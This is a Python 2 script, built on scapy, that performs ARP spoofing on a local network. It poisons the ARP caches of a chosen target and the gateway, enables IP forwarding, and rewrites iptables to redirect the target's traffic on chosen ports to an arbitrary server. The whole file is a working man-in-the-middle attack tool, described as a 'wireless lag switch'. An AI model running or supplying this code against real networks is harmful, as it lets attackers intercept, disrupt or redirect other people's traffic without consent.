#!/usr/bin/env python2

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess
import argparse
import signal
import os
import sys
import time

ipr = subprocess.Popen(['/sbin/ip', 'route'], stdout=subprocess.PIPE).communicate()[0].split()
gateway = ipr[2]
interface = ipr[4]
arp_thread = None
target = None

def enable_ip_forwarding():
    print("[+] Enabling IP forwarding")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fr:
        ret = subprocess.Popen(['echo', '1'], stdout=fr)
        if ret == 1:
            print("[-] Error Setting IP Forwarding")
            sys.exit(1)


def disable_ip_forwarding():
    print("[+] Disabling IP forwarding")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fr:
        ret = subprocess.Popen(['echo', '0'], stdout=fr)
        if ret == 1:
            print("[-] Error Setting IP Forwarding")
            sys.exit(1)


def set_iptables(ip, proxy_server=None, ports=None):
    print("[+] Modifying iptables")
    if not ports:
        ports = '80'
    os.system("/sbin/iptables -F")
    os.system("/sbin/iptables -t nat -F")
    os.system("/sbin/iptables -X")
    os.system("/sbin/iptables -A FORWARD --in-interface %s -j ACCEPT" % interface)
    os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface %s -j MASQUERADE" % interface)
    if proxy_server and ports:
        os.system("/sbin/iptables -t nat -A PREROUTING -p tcp -m multiport --dports %s --jump DNAT --to-destination %s" % (ports, proxy_server))


def get_MAC(ip):
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2)
    for s,r in ans:
        return r[Ether].src

def arp_poison(gateway, target):
    gateway_mac = get_MAC(gateway)
    target_mac = get_MAC(target)
    while True:
        send(ARP(op=2, pdst=target, psrc=gateway, hwdst=target_mac))
        send(ARP(op=2, pdst=gateway, psrc=target, hwdst=gateway_mac))
        time.sleep(2)


def arp_restore(signum, frame):
    print("[+] Restoring ARP")
    gateway_mac = get_MAC(gateway)
    target_mac = get_MAC(target)
    send(ARP(op=2, pdst=gateway, psrc=target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=3)
    send(ARP(op=2, pdst=target, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=3)



if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='arpspoof.py - Acts a wireless lag switch')
    parser.add_argument('-t', '--target', dest='target_ip', type=str, required=False, help="IP Address of target")
    parser.add_argument('-s', '--server', dest='server', type=str, required=False, help="IP Address of Server to forward traffic")
    parser.add_argument('-p', '--ports', dest='ports', type=str, required=False, help="Ports to forward to Server. Example: 80,443,22")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] You must run as root.")
        sys.exit(1)

    enable_ip_forwarding()
    if not args.target_ip:
        ip_range = '.'.join(gateway.split('.')[:-1]) + '.0/24'
        print(arping(ip_range))
        target = raw_input("Target: ")
    else:
        target = args.target_ip

    def signal_handler(signal, frame):
        disable_ip_forwarding()
        arp_restore(gateway, target)
        os.system("/sbin/iptables -F")
        os.system("/sbin/iptables -t nat -F")
        os.system("/sbin/iptables -t nat -X")
        os.system("/sbin/iptables -X")
        sys.exit(0)

    if args.ports is not None:
        set_iptables(args.target_ip, args.server, args.ports)
        signal.signal(signal.SIGINT, signal_handler)

    arp_poison(gateway,target)
